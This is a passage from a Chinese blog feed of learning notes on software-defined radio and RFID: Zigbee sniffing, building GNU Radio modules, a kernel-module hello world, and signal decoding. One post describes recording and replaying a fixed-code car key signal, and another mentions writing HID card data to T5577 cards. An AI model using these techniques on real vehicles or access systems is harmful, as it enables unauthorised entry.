        <content type="html"><![CDATA[<h1 id="ubiqua和cc2531实现zigbee抓包"><a href="#ubiqua和cc2531实现zigbee抓包" class="headerlink" title="ubiqua和cc2531实现zigbee抓包"></a>ubiqua和cc2531实现zigbee抓包</h1><p>首先安装ubiqua软件<br>然后安装cc2531驱动（不安装驱动计算机识别不出来，无法使用）<br>然后在ubiqua软件中选择菜单栏Device-&gt;Add device-&gt;local devices-&gt;cc2531（如果驱动安装成功，能识别出是cc2531），点击add<br>之后在Device Manager栏中会出现USB2531设备，往右拖动按钮可以开始抓包，如果没抓到，可以右击设备或者在Device-&gt;channel中选择不同频道</p><h1 id="USRP-B210和GNUradio实现zigbee发包"><a href="#USRP-B210和GNUradio实现zigbee发包" class="headerlink" title="USRP-B210和GNUradio实现zigbee发包"></a>USRP-B210和GNUradio实现zigbee发包</h1><h2 id="第一步：安装gr-foo"><a href="#第一步：安装gr-foo" class="headerlink" title="第一步：安装gr-foo"></a>第一步：安装gr-foo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bastibl/gr-foo.git</span><br><span class="line">cd gr-foo</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>中间cmake报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMake 3.8 or higher is required.  You are running version 3.5.1</span><br></pre></td></tr></table></figure><p>更新cmake,参考:<a href="https://askubuntu.com/questions/829310/how-to-upgrade-cmake-in-ubuntu" target="_blank" rel="noopener">https://askubuntu.com/questions/829310/how-to-upgrade-cmake-in-ubuntu</a></p><p>1、Check your current version with </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure><p>2、Uninstall it with </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove cmake</span><br></pre></td></tr></table></figure><p>3、Visit <a href="https://cmake.org/download/" target="_blank" rel="noopener">https://cmake.org/download/</a> and download the latest binaries<br>In my case cmake-3.6.2-Linux-x86_64.sh is sufficient copy the binary to /opt/<br>4、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /opt/cmake-3.*your_version*.sh (chmod makes the script executable)</span><br></pre></td></tr></table></figure><p>5、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash /opt/cmake-3.*your_version.sh* (you&apos;ll need to press y twice)</span><br></pre></td></tr></table></figure><p>The script installs to /opt/cmake-3.<em>your_version</em> so in order to get the cmake command, make a symbolic link:</p><p>6、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /opt/cmake-3.*your_version*/bin/* /usr/local/bin</span><br></pre></td></tr></table></figure><p>Test your results with </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure><p>cmake版本的问题解决后又出现了新问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CMake Error at CMakeLists.txt:98 (find_package):</span><br><span class="line">  Could not find a configuration file for package &quot;Gnuradio&quot; that is</span><br><span class="line">  compatible with requested version &quot;3.8&quot;.</span><br><span class="line"></span><br><span class="line">  The following configuration files were considered but not accepted:</span><br><span class="line"></span><br><span class="line">    /usr/local/lib/cmake/gnuradio/GnuradioConfig.cmake, version: 3.7.13.4</span><br></pre></td></tr></table></figure><p>谷歌不到类似问题，之后阅读github上的readme，可能是我的gr-foo的branches有问题，因为我的gnuradio最新版本就是3.7.13.4，看了之前gnuradio的安装过程，我尝试在gr-foo下用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout maint-3.7</span><br></pre></td></tr></table></figure><p>改变branch，成功cmake</p><p>之后一切顺利。</p><h2 id="第二步：安装gr-ieee802-15-4"><a href="#第二步：安装gr-ieee802-15-4" class="headerlink" title="第二步：安装gr-ieee802.15.4"></a>第二步：安装gr-ieee802.15.4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bastibl/gr-ieee802.15.4.git</span><br><span class="line">cd gr-ieee802.15.4</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">git checkout maint-3.7</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>打开gr-ieee802-15-4下的examples中的transceiver_CSS_USRP.grc可能会发现miss block，这是因为有些模块是由其它模块组成的，没办法在安装的过程中直接载入到GNUradio中，这时候把examples下的几个流程图都打开并运行一遍，重启GNUradio就会发现缺失的模块出现了</p><h2 id="第三步：运行gr-ieee802-15-4下app文件中的transceiver-sh"><a href="#第三步：运行gr-ieee802-15-4下app文件中的transceiver-sh" class="headerlink" title="第三步：运行gr-ieee802.15.4下app文件中的transceiver.sh"></a>第三步：运行gr-ieee802.15.4下app文件中的transceiver.sh</h2><p>运行transceiver.sh前需要在gr-ieee802-15-4下的examples创建transceiver_OQPSK.py文件，创建方法就是在gnuradio-compation中选中流程图后点击绿色箭头左边的generate按钮，就会生成一个py文件，运行这个py文件就相当于运行这个流程图（流程图可以参考gr-ieee802.15.4官网的zigbee教程搭建，具体参数可以参考gr-ieee802-15-4下的examples中的transceiver_CSS_USRP.grc流程图）</p><p>如果运行失败，可以用vim查看transceiver.sh文件，寻找原因</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-7-18-内核模块helloworld编写</title>
      <link href="/passages/2019-7-18-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97helloworld%E7%BC%96%E5%86%99/"/>
      <url>/passages/2019-7-18-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97helloworld%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="内核模块helloworld编译"><a href="#内核模块helloworld编译" class="headerlink" title="内核模块helloworld编译"></a>内核模块helloworld编译</h1><p>环境：Ubuntu14虚拟机</p><h2 id="内核模块编译流程"><a href="#内核模块编译流程" class="headerlink" title="内核模块编译流程"></a>内核模块编译流程</h2><p><img src="/images/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" alt="内核模块编译过程"></p><p>内核模块编译流程：</p><p>第一步：调用Linux源码树的makefile进行收集一个模块所需的信息</p><p>第二步：Linux源码树的makefile在收集完信息后，调用模块的makefile，获取需要编译的模块.c文件，最后生成内核模块</p><p>所以编译一个内核模块，需要写c程序和makefile文件</p><h2 id="编写c程序"><a href="#编写c程序" class="headerlink" title="编写c程序"></a>编写c程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);<span class="comment">//开源协议GPL</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">printk(KERN_ALERT<span class="string">"Hello,linux module!\n"</span>);</span><br><span class="line">    <span class="comment">//printk就是内核的printf，默认日志级别为4，只有权限不小于终端日志级别的时候才能输出（数字越小权限越高）</span></span><br><span class="line">    <span class="comment">//日志级别一共有8个，控制台级别可以cat /proc/sys/kernel/printk查看</span></span><br><span class="line">    <span class="comment">//显示四个参数分别控制台日志级别、printk默认日志级别、控制台可调节最低级别、控制台可调节最高级别</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">printk(KERN_ALERT<span class="string">"Hello,linux module exit!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);<span class="comment">//模块入口，完成模块加载</span></span><br><span class="line">module_exit(hello_exit);<span class="comment">//模块出口，完成模块卸载，释放资源</span></span><br></pre></td></tr></table></figure><h2 id="编写makefile"><a href="#编写makefile" class="headerlink" title="编写makefile"></a>编写makefile</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#KERNELRELEASE：在内核源码树的makefile中定义，在当前的makefile中值为空</span></span><br><span class="line"><span class="comment">#$(shell uname -r)：获取当前系统的linux内核版本</span></span><br><span class="line"><span class="comment">#KERNEL_DIR：指定当前linux操作系统源代码路劲</span></span><br><span class="line"><span class="comment">#一般出现Makefile missing separator. Stop就是格式错误，比如:</span></span><br><span class="line"><span class="comment">#makefile文件要注意用tab缩进，不能用空格</span></span><br><span class="line"><span class="comment">#函数后面要加空格，比如ifeq</span></span><br><span class="line"><span class="variable">$(info "<span class="built_in">call</span> hello makefile")</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line"><span class="comment">#ifeq就是判断是否相等，这里就是判断KERNELRELEASE是否等于空值，等于则返回true</span></span><br><span class="line">KERNEL_DIR ?=/lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="comment">#KERNEL_DIR是系统的源码树，为了让模块在linux中运行，就需要用当前linux的源码树中的makefile文件make</span></span><br><span class="line">PWD :=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNEL_DIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:modules clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNEL_DIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">obj-m := hello.o</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%BC%94%E7%A4%BA.png" alt="内核模块演示"></p><p>可以看到我们编写的makefile文件被调用了三次：</p><p>第一次：调用makefile文件，因为KERNELRELEAS为控制，所以调用源码树的makefile。</p><p>第二次：因为这次makefile文件是被Linux内核源码树的顶层makefile调用，变量KERNELRELEAS已经不为空了，所以编译hello.c文件，产生hello.o文件。</p><p>第三次：被Linux内核源码树的顶层makefile调用，根据.o文件生成.ko模块文件。</p><h2 id="模块的使用"><a href="#模块的使用" class="headerlink" title="模块的使用"></a>模块的使用</h2><p>1、加载模块：insmod *.ko</p><p><code>sudo insmod hello.ko</code></p><p>2、查看系统中加载的模块： lsmod</p><p><code>sudo lsmod|grep hello</code></p><p>3、卸载模块：rmmod *.ko</p><p><code>sudo rmmod hello</code></p><p>4、查看printk打印的信息 dmesg 或 dmeg|tail（dmesg是从linux内核的ring buffer 中读取信息的，而printk打印的信息都会送到ring buffer中）</p><p><img src="/images/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BB%93%E6%9E%9C.png" alt="内核模块结果"></p><p>最后结果如上图，hello模块成功运行。</p><p>本篇参考：<a href="http://blog.chinaunix.net/uid-26833883-id-4366882.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-26833883-id-4366882.html</a></p><p>makefile报错解决：<a href="https://bbs.csdn.net/topics/390344596" target="_blank" rel="noopener">https://bbs.csdn.net/topics/390344596</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-7-13-滚动码分析+arduino烧录程序</title>
      <link href="/passages/2019-7-13-%E6%BB%9A%E5%8A%A8%E7%A0%81%E5%88%86%E6%9E%90+arduino%E7%83%A7%E5%BD%95%E7%A8%8B%E5%BA%8F/"/>
      <url>/passages/2019-7-13-%E6%BB%9A%E5%8A%A8%E7%A0%81%E5%88%86%E6%9E%90+arduino%E7%83%A7%E5%BD%95%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="滚动码分析-arduino烧录程序"><a href="#滚动码分析-arduino烧录程序" class="headerlink" title="滚动码分析+arduino烧录程序"></a>滚动码分析+arduino烧录程序</h1><p>环境：<br>VMware Workstation Pro14<br>ubuntu16.04.3<br>GNUradio<br>UHD<br>arduino1.8.9</p><h2 id="滚动码分析"><a href="#滚动码分析" class="headerlink" title="滚动码分析"></a>滚动码分析</h2><p>说一说2019-7-8到2019-7-12这一周做了些什么事吧<br>固定码分析完后，又顺利完成了车钥匙的重放攻击，导师接着让我尝试用360生产的hackcube-special分析固定码，的确挺好用的，直接自动就显示固定码的信息了，重放的时候也比用usrpb210稳定很多（可能我一直没能设置好usrob210）<br><img src="/images/2019-7-13%E4%BD%8E%E9%A2%91%E5%8D%A1%E5%88%86%E6%9E%90/%E5%9B%BA%E5%AE%9A%E7%A0%81%E4%BF%A1%E5%8F%B7%E8%AF%BB%E5%8F%96.png" alt="avatar"><br>然后尝试用hackcube-special分析车钥匙的滚动码，结果失败了，因为它只提供keeloq加密的信号读取，而且只能是pwm方式进行信号提取（一般信号图上只有两种形状，然后一个作为1bit，一个作为0bit），我用usrpb210和inspectrum分析导师给的滚动码信号，发现除了大量重复的类似前导码和同步码的信号外，剩下的信号总共有四种形状，分别是：高低、高高低、高低低、高高低低，我估计这不是pwm而是曼彻斯特码或者差分曼彻斯特码。<br><img src="/images/2019-7-13%E4%BD%8E%E9%A2%91%E5%8D%A1%E5%88%86%E6%9E%90/%E6%BB%9A%E5%8A%A8%E7%A0%81%E5%88%86%E6%9E%90.png" alt="avatar"><br>关于hackcube能分析什么样的滚动码可以参考<a href="https://unicorn.360.com/hackcube/forum.php?mod=viewthread&amp;tid=17&amp;extra=page%3D1" target="_blank" rel="noopener">https://unicorn.360.com/hackcube/forum.php?mod=viewthread&amp;tid=17&amp;extra=page%3D1</a></p><p>因为滚动码的分析比较困难，而且在学习了主流的滚动码加密方式keeloq、hitag2、和hitag3后，发现都需要从硬件上提取密钥，目前我没有这方面能力，所以停止研究滚动码。</p><p>之后导师让我用hackcube研究低频卡，hackcube只能读取和写入em41xx系列的ID卡，但是还能往T5577卡内写入数据（因为em41xx和t5577卡的频率一样），而T5577也能写入HID卡的数据，于是就想修改hackcube代码从而实现往T5577卡内写入HID的数据</p><h2 id="学习arduion"><a href="#学习arduion" class="headerlink" title="学习arduion"></a>学习arduion</h2><p>为了往单片机里烧入程序，就需要用到arduion，arduion新建一个项目的时候会有一个初始程序<br><img src="/images/2019-7-13%E4%BD%8E%E9%A2%91%E5%8D%A1%E5%88%86%E6%9E%90/1.png" alt="avatar"><br>其中setup函数是单片机启动后之调用一次的函数<br>loop函数是单片机执行完setup后循环执行的函数<br>arduion的入门可以参考：<a href="https://blog.csdn.net/c80486/article/details/52506975" target="_blank" rel="noopener">https://blog.csdn.net/c80486/article/details/52506975</a></p><p>从github上clone完hackcube-special的代码后，可以直接打开ATmega32u4文件下的ATmega32u4.ino，里面就有setup和loop函数，打开它就能直接打开整个ATmega32u4项目（一开始我还一个一个文件拖到arduino）<br>然后选择菜单栏的工具-&gt;开发板 Arduino/Genuino Micro，之后点击左上角的勾号验证（如果编译错误可能是因为开发板选择错误了），然后就可以点击勾号旁边的上传了<br>具体可以参考：<a href="https://unicorn.360.com/hackcube/forum.php?mod=viewthread&amp;tid=64&amp;extra=page%3D1" target="_blank" rel="noopener">https://unicorn.360.com/hackcube/forum.php?mod=viewthread&amp;tid=64&amp;extra=page%3D1</a></p><p>剩下的内容就是逆向和编码了，就不细讲了，因为时间问题只是简单地往T5577写入了数据，不具有交互能力。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-7-9-固定码分析</title>
      <link href="/passages/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/passages/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="固定码遥控器信号分析"><a href="#固定码遥控器信号分析" class="headerlink" title="固定码遥控器信号分析"></a>固定码遥控器信号分析</h1><p>我的环境：<br>VMware Workstation Pro14<br>ubuntu16.04.3<br>GNUradio<br>UHD</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章中虽然我们已经完成了固定码遥控器的重放攻击，但我们并不清楚自己发送了什么数据，为了今后破解更复杂的无线电设备，今天就以固定码遥控器的简单例子来分析信号。</p><h2 id="第一步：安装inspectrum"><a href="#第一步：安装inspectrum" class="headerlink" title="第一步：安装inspectrum"></a>第一步：安装inspectrum</h2><p>inspectrum是一个分析信号的工具，界面如下<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/4.PNG" alt="avatar"></p><p>先安装inspectrum所需环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd $home</span><br><span class="line">mkdir inspectrum</span><br><span class="line">sudo apt-get install qt5-default libfftw3-dev cmake pkg-config</span><br><span class="line">git clone git://github.com/jgaeddert/liquid-dsp.git</span><br><span class="line">cd liquid-dsp</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure><p>然后安装inspectrum</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/miek/inspectrum.git</span><br><span class="line">cd inspectrum</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="第二步：分析信号"><a href="#第二步：分析信号" class="headerlink" title="第二步：分析信号"></a>第二步：分析信号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inspectrum test2.cfile</span><br></pre></td></tr></table></figure><p>在终端中用inspectrum打开我们之前录制的信号文件（inspectrum支持的文件类型有 .cf32, .cfile，.cs16，.cs8，.cu8，具体可以上<a href="https://github.com/miek/inspectrum查看）" target="_blank" rel="noopener">https://github.com/miek/inspectrum查看）</a><br>刚打开文件我们会得到一个如下图的界面<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/5.PNG" alt="avatar"></p><p>然后我们向右移动，就可以看到有数据的信号图，界面左边的spectrogram是用来调节信号图的长宽高以及信号增益的，具体用处会在之后提到<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/6.PNG" alt="avatar"></p><p>然后我们可以在信号图上右键，选择add derived plot，会出现四个选项，选择其中一项就会在信号图下方增加一个图层，之后我们分析数字信号就需要用到amplitude图层<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/7.PNG" alt="avatar"></p><p>添加amplitude图层的效果如下<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/8.PNG" alt="avatar"></p><p>我们可以用鼠标拖动信号图上的红色线，一般是拖动到信号图最亮的地方，然后可以拖动透明图层的上下两边来拉伸透明图层，然后增加power max（软件左边的选项之一）的值，最后效果如下图<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/9.PNG" alt="avatar"></p><p>如果得不到好的数字信号图，可以尝试着调节FFT size和ZOOM</p><p>我们得到了一个非常清楚的数字信号图（有宽矩形，有短矩形），然后可以勾选左边的enable cursors，会出现一个竖状的透明图层，symbol可以调节竖状透明图层的数量，我阅读固定码的相关资料后，知道一个短矩形宽度是4个振荡周期，长矩形宽度是12个振荡周期，然后32个振荡周期为一个帧，所以我的symbol设置为32然后选中一个长矩形和一个短矩形组成的帧。<br><img src="/images/2019-7-9-%E5%9B%BA%E5%AE%9A%E7%A0%81%E5%88%86%E6%9E%90/10.PNG" alt="avatar"></p><p>最后把这个透明图层移到第一个帧所在位置，32个周期*12个帧=384，把symbol设置为384，就可以看是对数字信号图进行分析了，每一个小的透明矩形里的数据可以分为0和1，可以右键导出每个小矩形中的数据，然后用python脚本判断0还是1。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-7-6-固定码遥控器重放攻击</title>
      <link href="/passages/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%81%A5%E6%8E%A7%E5%99%A8%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
      <url>/passages/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%81%A5%E6%8E%A7%E5%99%A8%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="车钥匙重放攻击"><a href="#车钥匙重放攻击" class="headerlink" title="车钥匙重放攻击"></a>车钥匙重放攻击</h1><p>我的设备：usrp-b210 315MHZ固定码钥匙<br>环境：ubuntu16.04.3</p><h2 id="1、确认信号频率"><a href="#1、确认信号频率" class="headerlink" title="1、确认信号频率"></a>1、确认信号频率</h2><p>设备的发射信号基本上厂家都会提供，查好信号频率后可以使用uhd的相关命令检测信号<br>uhd_fft -a serial=315F31C -f 315M -s 2M（M必须是大写，或者用000替代）<br>其中serial是我usrp-b210的设备序列号，可以通过uhd_find_devices查看<br>-f是频率 -s是采样率</p><p>当周围没有信号源时，示波器界面如下<br><img src="/images/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/1.png" alt="avatar"></p><p>按下钥匙按钮，发射信号，示波器界面如下<br><img src="/images/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/2.png" alt="avatar"></p><p>从waterfall界面能更直观地看出信号<br><img src="/images/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/3.png" alt="avatar"><br>蓝色是北京，当出现白色时说明接收到信号，白色越亮，说明信号强度越大，之所以会出现多列白点，我估计可能是因为信号波的反射（后来主管告诉我是谐波）</p><h2 id="2、利用GNUradio进行重放攻击"><a href="#2、利用GNUradio进行重放攻击" class="headerlink" title="2、利用GNUradio进行重放攻击"></a>2、利用GNUradio进行重放攻击</h2><p>这里我参考了别人利用hackRF和GNUradio实现的重放攻击<br>参考网址如下：599mag.com/2019/01/16/replay-attack-with-gnu-radio-and-hack-rf/</p><p>整个步骤可以分为两部分：录制和重放<br>录制需要GNU中uhd的接收组件（UHD:usrp source），重放需要uhd的发射组件(UHD:usrp sink)，而信号的存放和读取需要一个文件储存组件(file sink和file source)，额外可以加上一个图形界面确认自己的录制和重放是否正常（QT gui frequency sink）</p><p>打开GNU的命令：gnuradio-companion<br>录制：<br><img src="/images/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/4.png" alt="avatar"><br>重放：<br><img src="/images/2019-7-6-%E5%9B%BA%E5%AE%9A%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/5.png" alt="avatar"></p><p>这里面有四个关键参数：<br>其中两个是HDU组件的ch0的center freq和gain value，分别是频率和增益，频率就是设备的频率，上面两张图的频率应该改为315e6（我在测试其它设备就懒得改了），也就是315MHZ，增益是根据GNU官网上推荐的70-90，然后我取了中间值。<br>还有一个参数就是file组件的file，文件最好储存在home或者文档里，防止覆盖时因权限问题而出错。<br>最后一个参数是variable组件的value，一般新建一个视图的时候默认会有两个组件，一个是options，另外一个就是variable，而variable组件的默认ID是samp_rate，也就是采样率（每秒钟采样多少次），采样率决定了信号的精度，这里我选择2M。</p><p>参数设置好后，把三个主要组件的接口用鼠标左键连接起来，确认好接口的in和out，然后选中要用的组件后按上方的绿色三角形按钮，分别完成录制和重放，这时我们就完成了重放攻击。</p><h2 id="3、遇到的两个问题"><a href="#3、遇到的两个问题" class="headerlink" title="3、遇到的两个问题"></a>3、遇到的两个问题</h2><p>第一个问题：当我长按按钮时，信号灯会一直亮，松开后信号灯就灭了，但是用usrpb210重放攻击就会让信号灯不停闪烁，猜测可能是设备的精度问题，或者是我采样率设置有问题。<br>第二个问题：当我录制时，如果按钮靠天线太近，重放后的信号就会失效，信号灯没有反应，我猜测是我的天线靠近墙壁，信号的反射干扰比较严重。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-7-4-usrpb210环境搭建</title>
      <link href="/passages/2019-7-4-usrpb210%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/passages/2019-7-4-usrpb210%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="usrp-b210的环境搭建"><a href="#usrp-b210的环境搭建" class="headerlink" title="usrp b210的环境搭建"></a>usrp b210的环境搭建</h1><p>我的环境VM14+ubuntu16.04虚拟机<br>官方文档：<a href="https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux" target="_blank" rel="noopener">https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux</a></p><h2 id="新的ubuntu还需要下最新的cmake和python3"><a href="#新的ubuntu还需要下最新的cmake和python3" class="headerlink" title="新的ubuntu还需要下最新的cmake和python3"></a>新的ubuntu还需要下最新的cmake和python3</h2><p>cmake15安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.15/cmake-3.15.3-Linux-x86_64.tar.gz</span><br><span class="line">tar zxvf cmake-3.15.3-Linux-x86_64.tar.gz</span><br><span class="line">sudo mv cmake-3.15.3-Linux-x86_64 /opt/cmake-3.15.3</span><br><span class="line">sudo ln -sf /opt/cmake-3.15.3/bin/* /usr/bin/<span class="comment">#创建软连接，这样输入cmake命令的时候就是调用/opt/cmake-3.15.3文件下的cmake执行文件了，后面安装环境的时候可能会重新被3.5版本的make覆盖</span></span><br></pre></td></tr></table></figure><p>python3更新（后来发现也不用）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 